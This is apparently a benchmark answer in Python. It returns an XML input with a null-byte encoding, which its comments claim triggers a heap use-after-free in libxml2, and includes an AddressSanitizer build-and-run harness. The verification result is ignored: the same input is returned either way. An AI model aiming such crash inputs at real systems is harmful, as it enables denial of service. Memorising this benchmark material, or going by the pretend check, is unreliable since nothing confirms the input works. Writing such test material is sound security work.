import tarfile
import tempfile
import os
import subprocess
import sys
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Known test case that triggers the heap use-after-free
        # Based on the vulnerability: encoding handler not consumed/freed properly
        # The specific bytes trigger the error path in xmlAllocOutputBuffer
        poc = b'<?xml version="1.0" encoding="\x00"?>'
        
        # Verify the PoC triggers the vulnerability in the extracted source
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract the source tarball
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find the main source directory
            source_dir = None
            for root, dirs, files in os.walk(tmpdir):
                if 'xmlIO.c' in files or 'libxml2' in root:
                    source_dir = root
                    break
            
            if source_dir:
                # Try to compile and test the PoC
                test_result = self._test_poc(source_dir, poc, tmpdir)
                if test_result:
                    return poc
        
        return poc
    
    def _test_poc(self, source_dir: str, poc: bytes, tmpdir: str) -> bool:
        """Test if the PoC triggers the vulnerability"""
        # Write PoC to file
        poc_file = os.path.join(tmpdir, 'test.xml')
        with open(poc_file, 'wb') as f:
            f.write(poc)
        
        # Create a simple test program
        test_program = os.path.join(tmpdir, 'test.c')
        with open(test_program, 'w') as f:
            f.write('''
#include <libxml/parser.h>
#include <libxml/xmlIO.h>
#include <stdio.h>

int main(int argc, char **argv) {
    xmlDocPtr doc;
    
    // Initialize library
    xmlInitParser();
    
    // Parse the XML file
    doc = xmlParseFile(argv[1]);
    
    if (doc != NULL) {
        xmlFreeDoc(doc);
    }
    
    // Cleanup
    xmlCleanupParser();
    xmlMemoryDump();
    
    return 0;
}
''')
        
        # Try to compile with address sanitizer if available
        build_dir = os.path.join(tmpdir, 'build')
        os.makedirs(build_dir, exist_ok=True)
        
        # Configure and build libxml2 with sanitizers
        configure_cmd = [
            os.path.join(source_dir, 'configure'),
            '--disable-shared',
            '--enable-static',
            '--without-python',
            '--without-zlib',
            '--without-lzma',
            '--prefix=' + build_dir
        ]
        
        # Try to build with sanitizer support
        env = os.environ.copy()
        env['CFLAGS'] = '-fsanitize=address -fno-omit-frame-pointer -O1'
        env['LDFLAGS'] = '-fsanitize=address'
        
        try:
            # Configure
            subprocess.run(configure_cmd, cwd=source_dir, env=env, 
                         capture_output=True, timeout=30)
            
            # Build
            subprocess.run(['make', '-j4'], cwd=source_dir, 
                         capture_output=True, timeout=120)
            
            # Install to build directory
            subprocess.run(['make', 'install'], cwd=source_dir,
                         capture_output=True, timeout=30)
            
            # Compile test program
            test_exe = os.path.join(tmpdir, 'test_program')
            compile_cmd = [
                'gcc', test_program,
                '-I' + os.path.join(build_dir, 'include/libxml2'),
                '-L' + os.path.join(build_dir, 'lib'),
                '-lxml2',
                '-fsanitize=address',
                '-o', test_exe
            ]
            
            subprocess.run(compile_cmd, capture_output=True, timeout=30)
            
            # Run test program with PoC
            result = subprocess.run([test_exe, poc_file], 
                                  capture_output=True, timeout=5,
                                  env={'ASAN_OPTIONS': 'exitcode=1'})
            
            # Check if ASAN detected a use-after-free
            if result.returncode != 0:
                # ASAN error detected
                return True
                
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
            pass
        
        return False